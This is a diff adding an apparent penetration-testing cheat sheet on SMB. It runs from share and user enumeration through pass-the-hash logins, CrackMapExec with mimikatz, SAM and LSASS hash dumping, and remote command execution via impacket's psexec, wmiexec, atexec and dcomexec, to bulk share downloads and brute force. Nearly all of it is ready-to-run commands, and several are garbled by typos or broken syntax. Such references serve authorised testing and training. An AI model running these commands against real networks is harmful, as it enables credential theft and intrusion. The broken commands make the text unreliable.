@@ -1,0 +1,378 @@
+% smb, enum
+
+# Nmap simple Scan for SMB Shares
+nmap -Pn -p 445 --script=smb-enum-shares IP
+
+# Nmap NSE all scripts
+nmap --script smb-* -p 139,445, <IP>
+
+# Nmap NSE all enum scripts
+nmap --script smb-enum-* -p 139,445, <IP>
+
+# Nmap enumerate SMB Users 
+nmap -sU -sS --script=smb-enum-users -p U:137,T:139 <IP>
+
+# Nmap Scanning for the NetBIOS Service 
+nmap -sT -sU -sV <IP> -p 135,137,138,139,445 --open -oA <output_file>
+
+# Nmap Scan for Open SMB Shares
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 <IP_ou_range>
+
+# Nmap scans for vulnerable SMB Servers 
+nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 <IP>
+
+# nbtscan 
+nbtscan -r <IP>
+
+# enum4linux Null Session Enumeration 
+enum4linux -a <IP>
+
+# Nmap SMB NSE Scripts 
+nmap -v -p 139,445 <IP> --script smb-os-discovery.nse
+
+# smbclient shares listing
+smbclient -L <IP>
+
+# smbclient mount share
+smbclient //MOUNT/share -I <IP> -N
+
+# smbclient SMB Finger Printing 
+smbclient -L //<IP>
+
+# smbclient anonymous share
+smbclient \\\\<IP>\\www
+
+# smbclient Null Sessions 
+smbclient \\\\<IP> \\public
+
+# Nmap SMB OS Discovery
+nmap <IP> --script smb-os-discovery.ns
+
+# Nmap port scan 
+nmap -v -p 139,445 -oG smb.txt <IP>
+
+# nbtscan
+nbtscan -r <IP_ou_range>
+
+# Nmap find exposed Netbios servers
+nmap -sU --script nbstat.nse -p 137 <IP>
+
+# Nmap all SMB scripts scan 
+nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or exter\ 2 nal or fuzzer)' --script-args=unsafe=1 <IP>
+
+# Nmap NSE enum shares
+nmap --script smb-enum-shares <IP>
+
+# Nmap all SMB scripts authenticated scan 
+nmap -sV -Pn -vv -p 445 --script-args smbuser=,smbpass= --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 <IP>
+
+# nmblookup 
+nmblookup -A <IP>
+
+# rpcclient
+rpcclient -U "" <IP>
+
+# rpcclient
+rpcclient -U "" <IP> enumdomusers
+
+# Bash rpcclient "for loop" (Users list : https://github.com/insidetrust/statistically-likely-usernames)
+for u in $(cat <users_file>); do rpcclient -U "" <IP> -N --command="lookupnames $u"; done | grep "User: 1"
+
+# impacket enumerate SMB Users 
+python /usr/share/doc/python-impacket-doc/examples/samrdump.py <IP>
+
+# ridenum Null Sessions 
+ridenum.py <IP> 500 50000 dict.txt
+
+# Manual Null Session Testing - Windows
+net use \\<IP>\IPC$ "" /u:"
+
+# Manual Null Session Testing - Linux
+smbclient -L //<IP>
+
+# smbclient with share and user
+smbclient //<IP>/<sharename> -U <username> <password>
+
+# smbmap with domain
+smbmap -H <IP> -d <domain> -u "" -p ""
+
+# smbmap
+smbmap -H <IP>
+
+# Impacket SmbClient
+/usr/share/doc/python3-impacket/examples/smbclient.py <username>@<IP>
+
+# SMB Mount
+mount.cifs //$IP/<sharename>/ /mnt/shares/<sharename> -o username=<user>,pass=<password>
+
+--------------------------------------------------------------------------------------------------- parei aqui
+
+```text
+mkdir /mnt/www
+mount -t cifs \\\\<IP>\\www /mnt/www
+cd /mnt/www && ls -las
+```
+
+
+- [ ] CrackMapExec: 
+
+```text
+crackmapexec smb -L 
+crackmapexec 172.21.0.0 -u Administrator -H [hash] --local-auth
+crackmapexec 172.21.0.0 -u Administrator -H [hash] --share
+crackmapexec smb 172.21.0.0/24 -u user -p 'Password' --local-auth -M mimikatz
+
+
+## Upload
+
+```text
+curl --upload-file <file> -u '<user>' smb://$IP/<sharename>/
+```
+
+## SMB OS Discovery
+
+```text
+sudo nmap --script smb-os-discovery.nse <IP>
+```
+
+## Nmap port scan
+
+```text
+sudo nmap -v -p 139,445 -oG smb.txt $ip-254
+```
+
+## Netbios Information Scanning
+
+```text
+sudo nbtscan -r $ip/24
+```
+
+## Nmap find exposed Netbios serversn
+
+```text
+sudo map -sU --script nbstat.nse -p 137 $ip
+```
+
+## Nmap all SMB scripts scan
+
+```text
+sudo nmap -sV -Pn -vv -p 445 --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
+```
+
+## Nmap all SMB scripts authenticated scan
+
+```text
+sudo nmap -sV -Pn -vv -p 445 --script-args smbuser=<username>,smbpass=<password> --script='(smb*) and not (brute or broadcast or dos or external or fuzzer)' --script-args=unsafe=1 $ip
+```
+
+## SMB Enumeration Tools
+
+skipping 1 line
+
+```text
+smbclient //MOUNT/share -I $ip -N
+```
+
+```text
+rpcclient -U "" $ip
+```
+
+## SMB Finger Printing
+
+```text
+smbclient -L //$ip
+```
+
+## Nmap Scan for Open SMB Shares
+
+```text
+nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24
+```
+
+## Nmap scans for vulnerable SMB Servers
+
+```text
+nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip
+```
+
+## Nmap List all SMB scripts installed
+
+```text
+ls -l /usr/share/nmap/scripts/smb*
+```
+
+## Enumerate SMB Users
+
+```text
+nmap -sU -sS --script=smb-enum-users -p U:137,T:139 $ip-14
+OR
+python /usr/share/doc/python-impacket-doc/examples /samrdump.py $ip
+```
+
+## RID Cycling - Null Sessions
+
+```text
+ridenum.py $ip 500 50000 dict.txt
+```
+
+## Manual Null Session Testing
+
+```text
+Windows: 
+net use \\$ip\IPC$ "" /u:""
+Linux: 
+smbclient -L //$ip
+```
+
+```text
+ls /usr/share/nmap/scripts# ls | grep smb
+```
+
+```text
+enum4linux -a <ip>
+enum4linux -a -u <user> -p <password> <ip>
+enum4linux -a -u <user> -p "" <ip>
+enum4linux -Madl
+```
+
+```text
+nbtscan -r IP/24
+```
+
+```text
+sudo nmap -v --open -sS -Pn -p 139,445 <IP>
+sudo nmap -Pn -p 445 --script=smb-enum-shares IP
+```
+
+## List Shared Folder
+
+```text
+smbclient --no-pass -L //<IP> # Null user
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+smbmap -H <IP> [-P <PORT>] #Null user
+smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds
+smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash
+crackmapexec smb <IP> -u '' -p '' --shares #Null user
+crackmapexec smb <IP> -u 'username' -p 'password' --shares #Guest user
+```
+
+## Connect using smbclient
+
+```text
+smbclient --no-pass //<IP>/<Folder>
+smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash
+```
+Use --no-pass -c 'recurse;ls' to list recursively with smbclient
+
+## List with smbmap, without folder it list everything
+
+```text
+smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list
+smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list
+smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash
+```
+
+## Mount a shared folder
+
+```text
+mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share
+```
+
+## Download files
+
+```text
+sudo smbmap -R Folder -H <IP> -A <FileName> -q # Search the file in recursive mode and download it inside /usr/share/smbmap
+
+smbget -R smb://IP/<share path> -U <user>
+```
+
+## Download all
+
+```text
+smbclient //<IP>/<share>
+
+> recurse ON
+> prompt OFF
+> mget *
+```
+
+## ATExec
+Execute commands via the Task Scheduler (using \pipe\atsvc via SMB). In kali it is located on /usr/share/doc/python3-impacket/examples/
+
+```text
+./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
+./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
+```
+
+## Autenticate using Kerberos
+
+```text
+smbclient --kerberos //ws01win10.domain.com/C$
+rpcclient -k ws01win10.domain.com
+```
+
+```text
+apt-get install crackmapexec
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
+crackmapexec 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
+crackmapexec 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
+``` 
+
+## Pass-the-Hash
+
+- see: https://github.com/SecureAuthCorp/impacket/pull/381
+- see: https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatsheet/
+
+## Using --exec-method -1,2,3 wmiexec,atexec,smbexec
+
+```text
+crackmapexec -d <DOMAIN> -u Administrator -p 'password' --sam #Dump SAM
+crackmapexec -d <DOMAIN> -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
+```
+
+## psexec/smbexec
+
+If no password is provided, it will be prompted
+
+```text
+./psexec.py [[domain/]username[:password]@]<targetName or address>
+./psexec.py -hashes <LM:NT> administrator@IP #Pass-the-Hash
+psexec \\IP -u Administrator -p 123456Ww
+psexec \\IP -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
+```
+
+## wmiexec/dcomexec
+
+Stealthily execute a command shell without touching the disk or running a new service using DCOM via port 135. In kali it is located on /usr/share/doc/python3-impacket/examples/
+
+If no password is provided, it will be prompted
+
+```text
+./wmiexec.py [[domain/]username[:password]@]<targetName or address>
+``` 
+
+Prompt for password
+
+```text
+./wmiexec.py -hashes LM:NT administrator@IP #Pass-the-Hash
+```
+
+You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
+
+Using parameter-k  you can authenticate against kerberos instead of NTLM
+
+If no password is provided, it will be prompted
+
+```text
+./dcomexec.py [[domain/]username[:password]@]<targetName or address>
+./dcomexec.py -hashes <LM:NT> administrator@IP #Pass-the-Hash
+```
+
+You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompte
+
+## BruteForce
+
+```text
+sudo nmap --script smb-brute -p 445 <IP>
+ridenum.py <IP> 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce eachusername
+```
